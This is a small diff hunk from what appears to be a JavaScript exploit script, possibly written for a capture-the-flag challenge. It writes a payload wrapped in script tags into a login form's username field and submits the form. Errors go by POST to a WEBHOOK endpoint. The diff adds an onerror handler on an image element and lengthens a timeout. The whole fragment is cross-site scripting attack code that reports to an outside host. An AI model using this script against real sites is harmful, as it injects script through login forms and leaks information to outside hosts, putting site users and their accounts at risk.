@@ -45,9 +45,10 @@ try {
 }
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
+  document.getElementById("imgwait").onerror = "imgEnd()";
   document.getElementById("login").submit();
 
-  setTimeout(() => imgEnd(), 2000);
+  setTimeout(() => imgEnd(), 3000);
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
